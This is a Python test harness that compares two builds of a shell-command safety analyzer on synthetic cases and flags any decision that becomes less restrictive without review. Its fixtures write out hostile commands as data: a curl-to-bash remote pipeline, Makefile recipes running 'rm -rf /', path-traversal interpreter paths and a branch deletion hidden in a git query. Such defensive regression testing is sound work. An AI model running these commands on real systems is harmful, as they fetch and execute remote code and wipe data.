"""Compare two local analyzer builds using synthetic fixtures. Never run candidate commands."""
import argparse
import json
import os
from pathlib import Path
import shlex
import subprocess
import tempfile


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--baseline", required=True)
    parser.add_argument("--candidate", required=True)
    parser.add_argument("--output", required=True)
    parser.add_argument("--allow-relaxation", action="append", default=[], help="Explicitly reviewed case allowed to become less restrictive")
    args = parser.parse_args()
    binaries = [str(Path(value).resolve()) for value in (args.baseline, args.candidate)]
    root = Path(__file__).resolve().parents[1]
    cases = json.loads((root / "corpus/behavior-policy.json").read_text())
    for name, command in [
        ("traversal-python", "/usr/bin/../../tmp/python3 -c 'print(1)'"),
        ("traversal-node", "/opt/homebrew/bin/../../../tmp/node -e 'console.log(1)'"),
        ("trusted-prefix-lookalike", "/usr/bin-other/python3 -c 'print(1)'"),
        ("wrapped-remote-pipeline", "curl https://example.invalid/a | env bash"),
        ("git-current-branch-query", "git branch --show-current"),
        ("git-query-with-delete", "git branch --show-current -D main"),
        ("mktemp-literal-template", "mktemp ./demo.XXXXXX"),
    ]:
        cases.append({"name": name, "command": command})
    for name, command, files in [
        ("make-prerequisite", "make all", {"Makefile": "all: cleanup\ncleanup:\n\t@-rm -rf /\n"}),
        ("make-directory-and-file", "make -C sub -f build.mk all", {"sub/build.mk": "all:; rm -rf /\n"}),
        ("make-oneshell", "make all", {"Makefile": ".ONESHELL:\nall:\n\tcd /\n\trm -rf .\n"}),
        ("make-unresolved-function", "make all", {"Makefile": "all:\n\t$(shell echo never-executed)\n"}),
    ]:
        cases.append({"name": name, "command": command, "files": files})
    changes = []
    rank = {"allow": 0, "ask": 1, "force_ask": 2, "deny": 3}
    with tempfile.TemporaryDirectory(prefix="distill-compare-") as temporary:
        work = Path(temporary)
        config = work / "config.toml"
        config.write_text('[policy]\nprotected_paths = ["/srv/production"]\n')
        environment = {**os.environ, "HOME": str(work / "home"), "DISTILL_TRACE_DIR": str(work / "no-recorder")}
        for index, case in enumerate(cases):
            case_directory = work / f"workspace-{index}"
            case_directory.mkdir()
            for name, text in case.get("files", {}).items():
                file = case_directory / name
                file.parent.mkdir(parents=True, exist_ok=True)
                file.write_text(text)
            if "source" in case:
                source = work / f"case-{index}.{case['extension']}"
                source.write_text(case["source"])
                command = f"{case['tool']} {shlex.quote(str(source))} {case.get('arguments', '')}"
            else:
                command = case["command"]
            reports = []
            for binary in binaries:
                report = json.loads(subprocess.check_output([binary, "analyze", "--config", str(config), "--cwd", str(case_directory), "--command", command], env=environment))
                reports.append({"impact": report["impact_severity"], "approval_risk": report["severity"], "decision": report["decision"], "coverage": report["coverage"]["summary"]})
            before, after = reports
            if before != after:
                changes.append({"case": case["name"], "before": before, "after": after, "decision_downgrade": rank[after["decision"]] < rank[before["decision"]]})
    relaxed = [change["case"] for change in changes if change["decision_downgrade"]]
    unreviewed = [name for name in relaxed if name not in args.allow_relaxation]
    result = {"scope": f"{len(cases)} synthetic regression cases; candidate commands analyzed as data", "cases": len(cases), "changes": changes, "decision_downgrades": len(relaxed), "reviewed_decision_relaxations": [name for name in relaxed if name in args.allow_relaxation], "unreviewed_decision_relaxations": unreviewed}
    Path(args.output).write_text(json.dumps(result, indent=2) + "\n")
    print(json.dumps(result, indent=2))
    if unreviewed:
        raise SystemExit("Decision downgrades require review before rollout")


if __name__ == "__main__":
    main()
